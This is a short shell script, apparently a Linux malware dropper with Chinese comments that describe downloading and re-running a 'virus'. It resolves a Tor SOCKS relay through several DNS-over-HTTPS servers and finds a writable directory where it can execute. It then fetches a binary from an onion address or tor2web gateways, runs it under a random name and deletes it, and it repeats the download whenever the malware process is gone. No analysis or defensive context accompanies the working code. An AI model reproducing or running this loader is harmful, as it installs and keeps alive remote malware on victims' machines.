exec &>/dev/null
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
c=$(echo "curl -4fsSLkA- -m200")
t=$(echo "trumpzwlvlyrvlss")

sockz() {
p=$(echo "dns-query?name=relay.tor2socks.in")
s=$(($c https://doh.centraleu.pi-dns.com/$p ||
     $c https://dns.twnic.tw/$p ||
     $c https://dns.rubyfish.cn/$p ||
     $c https://doh.dns.sb/$p ; host -W 5 relay.tor2socks.in|awk {'print $NF'})\
     | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1 )
}

fexe() {
for i in $d /tmp /var/tmp /dev/shm /usr/bin ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done
}

u() {
sockz
fexe
f=/int.$(uname -m)
x=./$(date|md5sum|cut -f1 -d-)
# 下载病毒母体，并以随即名命名
$c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
# 运行后删除病毒文件
chmod +x $x;$x;rm -f $x
}

for h in tor2web.in tor2web.io tor2web.to tor2web.su
do
# 循环监控，若病毒进程没在跑，则重新下载运行
if ! ls /proc/$(head -1 /tmp/.X11-unix/00)/io; then
u $t.$h
else
break
fi
done